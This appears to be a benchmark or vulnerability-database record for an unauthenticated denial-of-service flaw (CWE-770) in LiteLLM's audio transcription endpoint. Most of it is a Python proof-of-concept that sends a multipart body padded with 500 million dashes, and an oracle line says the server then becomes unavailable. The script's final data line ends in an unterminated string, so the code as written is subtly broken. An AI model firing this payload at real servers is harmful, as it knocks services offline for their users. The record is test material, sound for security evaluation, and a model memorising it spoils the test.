title: Unauthenticated Denial of Service via excessive multipart boundary processing in LiteLLM
cwe: CWE-770: Allocation of Resources Without Limits or Throttling
trigger_payload:
import requests
num = 500000000
url = "{BASE_URL}/v1/audio/transcriptions"
headers = {
"Content-Type": "multipart/form-data; boundary=---------------------------28417"
}
# The exact raw payload as specified
data = (
"-----------------------------284178091740602105783377960069\r\n"
"Content-Disposition: form-data; name=\"uploadFile\"; filename=\"test.txt\"\r\n"
"Content-Type: text/plain\r\n\r\n"
"Hello I am test\r\n"
"-----------------------------284178091740602105783377960069--" + '-' * num + "
)
response = requests.post(url, headers=headers, data=data.encode('utf-8'), verify=False)
print(response.status_code)
print(response.text)
oracle: Server becomes unresponsive and service is unavailable
